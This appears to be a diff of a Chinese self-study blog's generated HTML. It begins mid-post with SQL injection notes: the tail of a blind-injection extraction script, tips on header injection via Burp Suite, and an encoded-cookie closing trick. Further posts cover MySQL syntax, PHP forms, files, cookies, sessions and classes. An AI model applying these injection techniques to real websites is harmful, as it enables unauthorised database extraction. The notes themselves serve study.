class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="头文件注入"><a href="#头文件注入" class="headerlink" title="头文件注入"></a>头文件注入</h1><ol>
+<li>如果网站记录了浏览信息或者是IP信息之类,就有可能存在头注入</li>
+<li>有些网站可能需要登入进之后才能进行头注入</li>
+<li>需要注意闭合和列数要保持一致</li>
+<li>本质上几种不同的头文件注入没有区别</li>
+<li>可以利用hackbar,也可以用抓包软件burpsuite进行请求头的修改<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230330204747.png" alt="请求头"></li>
+</ol>
+<h1 id="注入编码"><a href="#注入编码" class="headerlink" title="注入编码"></a>注入编码</h1><p>有时候网站会对<code>cookie</code>或其他的一些注入点进行编码,这时候需要把我们的查询语句编码后再放入指定位置,但注释符也可能无法成功编码,这时候可以利用<code>and &#39;1&#39;=&#39;1</code>类似这样的语句产生注释效果</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/21/MYSQL%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/21/MYSQL%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">MYSQL的简单学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-21 20:47:47" itemprop="dateCreated datePublished" datetime="2023-03-21T20:47:47+08:00">2023-03-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-05-03 17:04:00" itemprop="dateModified" datetime="2023-05-03T17:04:00+08:00">2023-05-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/MYSQL/" itemprop="url" rel="index"><span itemprop="name">MYSQL</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="MYSQL简介"><a href="#MYSQL简介" class="headerlink" title="MYSQL简介"></a>MYSQL简介</h2><ol>
+<li><strong>关系型数据库</strong><br>MYSQL数据库是一个关系型数据库,关系型数据库就是指,建立在关系模型的基础上,由多张互相连接的二维表组成的数据库</li>
+<li><strong>数据模型</strong><br>通过客户端连接数据库管理系统(DBMS),通过DBMS创建数据库,再通过数据库创建数据表<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230321210554.png"></li>
+<li><strong>MYSQL启动与连接</strong><br>–启动,以管理员身份运行命令行<code>net start mysql80</code>,关闭<code>net stop mysql80</code><br>–连接,可以用mysql自带的客户端命令行运行,也可以在系统的命令行里输入<code>mysql -u root -p</code></li>
+</ol>
+<h2 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a>SQL语法</h2><ol>
+<li><strong>通用语法</strong><ol>
+<li>sql语法是以英文分号<code>;</code>结尾,可以多行书写,或使用空格来增强语句的可读性</li>
+<li>MYSQL数据库的语句不区分大小写,但是关键字建议使用大写</li>
+<li>注释:   单行注释:<code>--</code>,<code>#</code>    多行注释:<code>/*  */</code></li>
+</ol>
+</li>
+<li><strong>分类</strong><ol>
+<li>DDL  数据库定义语言</li>
+<li>DML  数据库操作语言</li>
+<li>DQL  数据库查询语言</li>
+<li>DCL  数据库控制语言<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230321195429.png"></li>
+</ol>
+</li>
+</ol>
+<h3 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h3><p>将DDL语句主要分为<strong>数据库</strong>,<strong>表</strong>,<strong>字段</strong>来讲解</p>
+<ol>
+<li><p><strong>DDL的数据库操作</strong></p>
+<ol>
+<li>创建新的数据库 <code>create database 数据库名;</code></li>
+<li>删除数据库 <code>drop database 数据库名;</code></li>
+<li>查询所有数据库 <code>show databases;</code></li>
+<li>查询当前数据库 <code>select database();</code></li>
+<li>使用,进入数据库 <code>use 数据库名;</code></li>
+</ol>
+</li>
+<li><p><strong>表操作</strong><br>在进行表操作时,必须先进入数据库中(use)</p>
+<ol>
+<li>创建新的表 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">    字段<span class="number">1</span> 类型 [comment 注释],    #有逗号,</span><br><span class="line">    字段<span class="number">2</span> 类型 [comment 注释],    #[]表示里面可有可无</span><br><span class="line">    <span class="keyword">last</span>字段 类型 [comment 注释]  #最后一个字段后面没有逗号</span><br><span class="line">)[comment 注释];    #语句结束需要用分号;</span><br></pre></td></tr></table></figure></li>
+<li>删除表 <code>drop table 表名;</code></li>
+<li>修改表名 <code>alter table 旧表名 rename to 新表名;</code></li>
+<li>查询当前数据库所有表 <code>show tables;</code></li>
+<li>查询指定表的建表语句 <code>show creat table 表名;</code></li>
+</ol>
+</li>
+<li><p><strong>字段操作</strong>  </p>
+<ol>
+<li>增加表中的字段<code>alter table 表名 add 字段名 类型 [comment 注释] [约束];</code></li>
+<li>删除表中的字段名<code>alter table 表名 drop 字段名;</code></li>
+<li>修改表中的字段数据类型<code>alter table 表名 modify 字段名 新数据类型;</code></li>
+<li>修改表中的字段名和字段类型<code>alter table 表名 change 旧字段名 新字段名 新数据类型 [comment 注释] [约束];</code></li>
+<li>查询表结构(所有的字段) <code>desc 表名;</code></li>
+</ol>
+</li>
+</ol>
+<h3 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h3><p>DML是数据操作语言,主要对表中的数据进行<strong>增删改</strong>的操作</p>
+<ol>
+<li><p><strong>数据的增加</strong></p>
+<ol>
+<li>给指定字段添加数据<br><code>insert into 表名(字段1,字段2,...) values(值1,值2,...);</code> &#x2F;&#x2F;指定字段添加一行数据</li>
+<li>给全部字段添加数据<br><code>insert into 表名 values(值1,值2,...);</code>  &#x2F;&#x2F;有几个字段就要填写几个值,添加一行数据</li>
+<li>指定字段批量添加数据<br><code>insert into 表名(字段1,字段2,...) values(值1,值2,...),(值1,值2,...);</code> &#x2F;&#x2F;指定字段添加好几行</li>
+<li>全部字段批量添加数据<br><code>insert into 表名 values(值1,值2,...),(值1,值2,...);</code>  &#x2F;&#x2F;values有几个括号就有几行值</li>
+<li>注意: 字符串和日期型数据需要包含在引号中,数据的大小不能超过规定大小</li>
+</ol>
+</li>
+<li><p><strong>数据的删除</strong><br><code>delete from 表名 [where 条件];</code><br>delete删除的不是某一字段的值,而是符合条件的那一整行值,如果没有条件则删除全部数据。<br>如果要删除某一字段的值可以用update将值改为NULL;</p>
+</li>
+<li><p><strong>数据的修改</strong><br><code>update 表名 set 字段名1=值1,字段名2=值2,...[where 条件];</code><br>条件控制着哪几行做修改,如果没有条件,则修改整张表格</p>
+</li>
+</ol>
+<h3 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h3><p>DQL是数据查询语言,主要用来<strong>查询</strong>数据</p>
+<ol>
+<li><p><strong>基本查询</strong></p>
+<ol>
+<li>查询指定字段<code>select 字段1,字段2,... from 表名;</code></li>
+<li>查询所有字段<code>select * from 表名;</code>  &#x2F;&#x2F;*代表所有字段,但是不太直观</li>
+<li>设置别名<code>select 字段1[as 别名1],字段2 [as 别名2],... from 表名;</code></li>
+<li>去除重复内容<code>select [distinct] 字段列表 from 表名;</code>  加上distinct即可</li>
+</ol>
+</li>
+<li><p><strong>条件查询</strong><br>过滤不符合条件的数据</p>
+<ol>
+<li><code>select 字段列表 from 表名 where 字段1 条件 [and 字段2 条件...];</code><br>条件:</li>
+<li><code>between 最小值 and 最大值</code>  在最小值(包含)和最大值(包含)之间的结果</li>
+<li><code>in()</code>   在只要满足in()中的其中一个条件的数据都会被打印出来</li>
+<li><code>like 占位符</code>  占位符**_**代表一个字符(如<code>__</code>表示两个字符大小的数据),  **%**代表任意个字符(如 <code>%x</code> 代表所有以x结尾的数据)</li>
+<li><code>is null</code>,<code>is not null</code>  数据是null</li>
+<li>其余常见<code>&gt;</code>,<code>&lt;</code>,<code>&gt;=</code>,<code>&lt;=</code>,<code>=</code>,<code>!= 和 &lt;&gt;</code>,<code>and 和 &amp;&amp;</code>,<code>or 和 ||</code>,<code>not 和 !</code></li>
+</ol>
+</li>
+<li><p><strong>聚合函数</strong><br>聚合函数都是作用于数据的某一列的(某一字段), 是某一列的运算(null值不参与所有聚合函数的运算)</p>
+<ol>
+<li><code>select 聚合函数(字段列表) from 表名;</code>  </li>
+<li>常见聚合函数<br> <img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230325193715.png"></li>
+</ol>
+</li>
+<li><p><strong>分组查询</strong><br><code>select 聚合函数(字段列表) from 表名 [where 条件] group by 分组字段名(或聚合函数) [having 分组后再次过滤的条件];</code><br><strong>where</strong> 是分组前的过滤, <strong>group by</strong> 是分组, <strong>having</strong> 是分组之后的过滤<br><code>where</code>不能对集合函数进行判断,而<code>having</code>可以<br>举个例子:<br><code>select school,count(*) from student where age&lt;16 group by school having count(student)&gt;100;</code><br>含义:查询所有年龄小于16的学生(<code>select count(*) from student where age&lt;16</code>),并根据学校进行分组(<code>group by school</code>),统计各个学校的学生数量(<code>count(*)</code>),选出学生大于一百的学校(<code>having count(student)&gt;100</code>)</p>
+</li>
+<li><p><strong>排序查询</strong></p>
+<ol>
+<li>语法:  <code>select 字段列表 from 表名 order by 字段1 [desc],字段2 [desc];</code></li>
+<li><strong>desc</strong>表示该查询结果为降序排序,如果不写,则默认是升序<strong>asc</strong></li>
+<li>如果有多个字段进行排序,当第一个字段相同时,再按照第二个字段的排序</li>
+</ol>
+</li>
+<li><p><strong>分页查询</strong><br>分页查询的语法,不同的数据库有不同的实现,这里介绍mysql的<strong>limit</strong><br>语法:  <code>select 字段列表 from 表名 limit 起始值,查询数据数;</code><br>注意:  起始值是以0作为开始,展示的数据是从(起始值+1)开始<br>如第一页可以表示成:<br><code>select age from user limit 0,5;</code>  &#x2F;&#x2F;表示从第1条数据开始,展示后面的5条数据(包含第一条)<br>例如<br><code>select * from user limit 0,1;</code>  &#x2F;&#x2F;表示展示这张表中第一行的的全部数据</p>
+</li>
+<li><p><strong>编写顺序与执行顺序</strong><br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230325212816.png"><br>蓝色代表编写顺序,红色序号代表执行顺序</p>
+</li>
+</ol>
+<h3 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h3><p>DCL是数据控制语言,主要作用是管理<strong>用户</strong>,控制<strong>访问权限</strong></p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>联合查询(union查询),就是把多次查询的结果合并起来,形成一个新的查询结果集</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表a</span><br><span class="line"><span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表b;</span><br></pre></td></tr></table></figure>
+<p>注意: <code>union</code>去重, <code>union all</code>不去重<br>对于联合查询的多张表的列数必须保持一致,字段类型也必须保持一致。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/18/PHP%E7%9A%84%E5%AD%A6%E4%B9%A02-0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/18/PHP%E7%9A%84%E5%AD%A6%E4%B9%A02-0/" class="post-title-link" itemprop="url">PHP的学习2.0</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-18 10:10:51" itemprop="dateCreated datePublished" datetime="2023-03-18T10:10:51+08:00">2023-03-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-24 22:23:59" itemprop="dateModified" datetime="2023-03-24T22:23:59+08:00">2023-03-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>前面经过一周的PHP学习，这是第二周</p>
+<h2 id="简单表单"><a href="#简单表单" class="headerlink" title="简单表单"></a>简单表单</h2><p>语法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;提交表单的地址&quot;</span> method=<span class="string">&quot;提交表单的方式&quot;</span>&gt;  <span class="comment">//GET POST REQUEST</span></span><br><span class="line"> &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;提交数据的名称&quot;</span>&gt;   <span class="comment">//type属性中的text表示上传类型是文本</span></span><br><span class="line"> &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;提交数据的名称&quot;</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;   <span class="comment">//type属性中的submit表示这是一个提交按钮</span></span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>可以用超全局变量<code>$_POST[]</code>,<code>$_GET[]</code>,<code>$_REQUEST</code>获取提交的表单数据</p>
+<h2 id="文件上传表单"><a href="#文件上传表单" class="headerlink" title="文件上传表单"></a>文件上传表单</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;  </span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>和简单表单类似，将type属性改成<strong>file</strong>表示上传的是一个文件.<br>enctype表示提交表单要使用哪种内容类型，文件用<code>enctype=&quot;multipart/form-data&quot;</code>.<br>方式一般使用post类型。<br>上传的文件保存在超全局变量<code>$_FILES</code>中<br>如在<strong>upload_file.php</strong>中使用<code>print_r($_FILES)</code>,可以打印查看文件的信息<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230318151115.png"></p>
+<h2 id="date格式化日期"><a href="#date格式化日期" class="headerlink" title="date格式化日期"></a>date格式化日期</h2><p><code>date(&quot;format&quot;)</code><br>format可以是 d（天），m（月），Y（年）,中间可以插入其他字符<br>例如 <code>echo date(Y/m/d)</code>  结果<code>2023/3/18</code></p>
+<h2 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h2><p><code>include &#39;文件名&#39;;</code><br><code>require &#39;文件名&#39;;</code><br><code>include_once &#39;文件名&#39;;</code><br><code>require_once &#39;文件名&#39;;</code><br>区别找不到文件时require生成致命错误，include产生一个警告，继续执行。<br>一个文件包含两次相同的文件会报错，加上_once就只会扫描一次，不会报错</p>
+<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><ol>
+<li><p><strong>打开文件</strong><br><code>$file=fopen(&quot;文件名&quot;，&quot;打开模式&quot;);</code><br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230318111159.png" alt="几种模式"></p>
+</li>
+<li><p><strong>关闭文件</strong><br><code>fcloes($file);</code>  &#x2F;&#x2F;<em>流程，打开文件，执行一些代码，关闭文件</em></p>
+</li>
+<li><p><strong>检测文件末尾（EOF）</strong><br><code>feof($file);</code><br>在循环遍历未知长度的数据时，feof() 函数很有用。</p>
+</li>
+<li><p><strong>逐行读取文件</strong><br><code>fgets($file);</code><br>在调用该函数之后，文件指针会移动到下一行.</p>
+</li>
+<li><p><strong>逐字符读取文件</strong><br><code>fgetc($file)</code><br>在调用该函数之后，文件指针会移动到下一个字符。</p>
+</li>
+</ol>
+<p><strong>完整演示</strong>一遍操作文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;welcome.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;无法打开文件!&quot;</span>);  <span class="comment">//打开文件只读</span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$file</span>))  <span class="comment">//判断是否到EOF</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">fgetc</span>(<span class="variable">$file</span>);  <span class="comment">//逐字符遍历数组，也可以fgets逐行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);   <span class="comment">//关闭文件</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>cookie常用于识别用户，是服务器留在用户计算机上的小文件，计算机请求页面时，计算机会发送cookie。</p>
+<ol>
+<li><strong>创建cookie</strong><br><code>&lt;?php  setcookie(name,value,expire,path,domain);  ?&gt;</code><br> &#x2F;&#x2F;必须位于<html>标签之前<br>例如<code>setcookie(&quot;user&quot;, &quot;miao&quot;, time()+3600)</code> &#x2F;&#x2F;名user，值miao，3600秒后过期<br>也可以<code>$a=time()+60*60*24*30; setcookie(&quot;user&quot;, &quot;miao&quot;, $a)</code><br>&#x2F;&#x2F;60秒<em>60分</em>24小时*30天</li>
+<li><strong>取回cookie的值</strong><br>可以用超全局变量<code>$_COOKIE[]</code>取回cookie<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];   <span class="comment">// 输出user的cookie 值</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_COOKIE</span>);     <span class="comment">// 查看所有 cookie</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>删除cookie</strong><br>把<code>time()</code>改成过去的时间<br>例如<code>setcookie(&quot;user&quot;, &quot;miao&quot;, time()-360);</code> </li>
+<li><strong>检测是否设置了cookie</strong><br>使用<code>isset($_COOKIE[])</code></li>
+<li><strong>编码方式</strong><br>在发送cookie时，cookie的值会自动进行URL编码,在取回时进行自动解码。为防止URL编码，请使用<code>setrawcookie()</code>取而代之</li>
+</ol>
+<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>session变量是用于储存用户会话信息（用户数据），更改用户会话信息的设置。工作机制：为每个访客创建一个唯一的id(UID)，并基于这个UID来存储变量。UID存储在cookie中，或者通过URL进行传导</p>
+<ol>
+<li><strong>启动会话</strong><br><code>session_start()</code>  &#x2F;&#x2F;&#x2F;<em>函数必须位于<html>标签之前</em></li>
+<li><strong>储存session变量</strong><br>使用<code>$_SESSION[]</code>超级变量，并进行赋值<br>例如<br>可以将用户的浏览量设置成<br><code>$_SESSION[&#39;views&#39;]</code>,每次访问后使<code>$_SESSION[&#39;views&#39;]+=1</code><br>或是给用户添加admin权限等<br>如果用户成功登陆的话，储存一个登陆成功的凭证的session <code>$_SESSION[admin]=ture</code></li>
+<li><strong>销毁Session</strong><br>如果希望删除某些session数据，可以使用<code>unset()</code>或<code>session_destroy()</code>函数<br><strong>unset()</strong> 函数用于释放指定的session变量:例如  <code>$_SESSION[&#39;views&#39;]</code><br><strong>session_destroy()</strong> 函数彻底销毁重置session  </li>
+<li><strong>检测是否设置了session</strong><br>使用<code>isset($_SESSION[])</code></li>
+</ol>
+<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><strong>JSON定义</strong> ：一种轻量级的数据交换语言，以文本字符串为基础</p>
+<ol>
+<li>{} 双括号表示对象</li>
+<li>[] 中括号表示数组</li>
+<li>“” 双引号内是属性或值</li>
+<li>: 冒号表示后者是前者的值(这个值可以是字符串、数字、也可以是另一个数组或对象)</li>
+<li>，逗号用来分隔属性或者对象</li>
+<li>例如<code>&#123;&quot;a&quot;:16,&quot;b&quot;:18,&quot;c&quot;:20&#125;</code></li>
+</ol>
+<p><strong>PHP JSON</strong></p>
+<ol>
+<li><p><code>json_encode($value，参数)</code>     &#x2F;&#x2F;   对变量（对象也可以）进行json编码<br><code>JSON_UNESCAPED_UNICODE</code>  参数选项，如果我们不希望中文被编码，可以添加该参数。</p>
+</li>
+<li><p><code>json_decode(json字符串)</code>  对json格式字符解码，转化成php变量</p>
+</li>
+</ol>
+<p><strong>serialize</strong><br><code>serialize()</code>序列化是将变量(或者对象)转换为可保存或传输的字符串的过程<br><strong>unserialize</strong><br><code>unserialize()</code>反序列化就是在适当的时候把这个字符串再转化成原来的变量使用</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/17/PHP%E7%9A%84%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/17/PHP%E7%9A%84%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/" class="post-title-link" itemprop="url">PHP的类与对象</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-17 16:23:03" itemprop="dateCreated datePublished" datetime="2023-03-17T16:23:03+08:00">2023-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-29 21:12:06" itemprop="dateModified" datetime="2023-04-29T21:12:06+08:00">2023-04-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><ol>
+<li><strong>定义类</strong><br>在php中使用<code>class name&#123;&#125;</code></li>
+<li><strong>实例化</strong><br>使用 <code>$name=new name()</code>;创建一个对象$name。</li>
+<li><strong>类属性与类方法</strong><br>在类的外部使用类属性和类方法时，要通过实例化的对象<code>$name -&gt;a</code> ,<code>$name -&gt;a()</code><br>类的内部访问时要通过伪变量<code>$this -&gt;</code>（$this当前的对象）</li>
+<li><strong>类常量</strong><br>在类的内部定义常量用<code>const</code>关键字，类中的常量归类所有，而不是归对象所有，要访问类中的对象，在外部可以使用<code>类名::常量名</code>,在类的内部可以使用<code>self::类名</code>调用（self当前的类）。</li>
+<li><strong>static(静态)</strong><br>–声明类的属性或方法为 static(静态)，就可以不实例化类而直接访问。声明为静态后，此时的方法和属性就归类所有，不归对象所有。<br>–静态成员的访问，外部：<code>类名::成员名</code>,内部:可以使用<code>self::成员名</code>或<code>类名::成员名</code>.(成员包括属性与方法)<br>–实际上，在低版本中php中的方法默认是静态的，所以事实上静态方法还是可以通过实例化的对象访问（不推荐），静态属性则不行。<br>–由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。</li>
+</ol>
+<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><ol>
+<li><strong>继承的格式</strong><br><code>class 子类名 extends 父类名&#123;&#125;</code></li>
